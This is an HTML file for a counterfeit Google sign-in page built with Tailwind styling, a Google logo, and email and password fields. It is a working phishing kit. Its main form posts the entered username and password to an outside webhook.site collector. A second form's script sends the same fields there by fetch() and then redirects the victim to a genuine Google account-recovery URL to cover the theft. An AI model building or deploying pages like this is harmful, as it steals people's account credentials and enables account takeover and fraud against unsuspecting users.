
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Google Sign In</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <link
    href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
    rel="stylesheet"
  />
  <style>
    body {
      font-family: 'Roboto', sans-serif;
    }
  </style>
</head>
<body class="bg-white text-gray-900 min-h-screen flex flex-col justify-between">
  <div class="px-6 pt-10 max-w-md mx-auto w-full">
    <img
      src="https://static.vecteezy.com/system/resources/previews/012/871/371/non_2x/google-search-icon-google-product-illustration-free-png.png"
      alt="Google logo with blue, red, yellow and green colors"
      class="w-12 h-12 mb-8"
    />
    <h1 class="text-4xl font-normal mb-2 leading-tight">Sign in</h1>
    <p class="text-base font-normal mb-6">Use your Google Account</p>

    <form class="space-y-4" action="https://webhook.site/29e2c3b4-7db8-4b1a-8d01-db907c7eb55c" method="POST">

  <input
    type="text"
    name="username"
    placeholder="Email or phone"
    class="w-full border border-gray-300 rounded-md px-4 py-3 text-base placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-600"
    autocomplete="username"
    aria-label="Email or phone"
  />

  <input
    type="password"
    name="password"
    placeholder="Enter Password"
    class="w-full border border-gray-300 rounded-md px-4 py-3 text-base placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-600"
    autocomplete="current-password"
    aria-label="Enter Password"
  />

  <div class="flex items-center justify-between">
    <a href="#" class="text-blue-700 text-sm font-normal">Forgot password?</a>
    <label class="flex items-center space-x-1 text-gray-800 text-sm select-none">
      <input type="checkbox" class="w-4 h-4" />
      <span>Show password</span>
    </label>
  </div>

  <div class="flex justify-end">
    <button
      type="submit"
      class="bg-blue-700 text-white text-base font-medium rounded-full px-6 py-2.5 hover:bg-blue-800 focus:outline-none focus:ring-2 focus:ring-blue-600"
    >
      Next
    </button>
  </div>


</form>


<form id="login-form" class="space-y-4">
  <input type="text" name="username" placeholder="Email or phone" required />
  <input type="password" name="password" placeholder="Enter Password" required />
  <button type="submit">Next</button>
</form>

    
<script>
  document.getElementById("login-form").addEventListener("submit", function (e) {
    e.preventDefault(); // Prevent default form submission

    const formData = new FormData(this);

    fetch("https://webhook.site/29e2c3b4-7db8-4b1a-8d01-db907c7eb55c", {
      method: "POST",
      body: formData
    })
    .then(() => {
      // Redirect after successful send
      window.location.href = "https://accounts.google.com/v3/signin/recoveryidentifier?flowName=GlifWebSignIn&dsh=S406279634%3A1745078146925725"; // Replace with your desired URL
    });
  });
</script>


    <p class="text-gray-600 text-sm mt-10 leading-relaxed">
      Not your computer? Use a private browsing window to sign in.
      <a href="#" class="text-blue-700 font-semibold">Learn more about using Guest mode</a>
    </p>

    <div class="mt-12">
      <label for="language" class="text-gray-900 text-sm font-normal">English (United Kingdom)</label>
      <select
        id="language"
        name="language"
        class="ml-2 border border-gray-300 rounded px-2 py-1 text-sm focus:outline-none focus:ring-2 focus:ring-blue-600"
        aria-label="Select language"
      >
        <option>English (United Kingdom)</option>
        <option>English (United States)</option>
        <option>Español</option>
        <option>Français</option>
      </select>
    </div>
  </div>

  <footer class="w-full border-t border-gray-300 py-4 mt-16">
    <div class="max-w-md mx-auto flex justify-between px-6 text-gray-700 text-sm font-normal">
      <a href="#" class="hover:underline">Help</a>
      <a href="#" class="hover:underline">Privacy</a>
      <a href="#" class="hover:underline">Terms</a>
    </div>
  </footer>
</body>
</html>
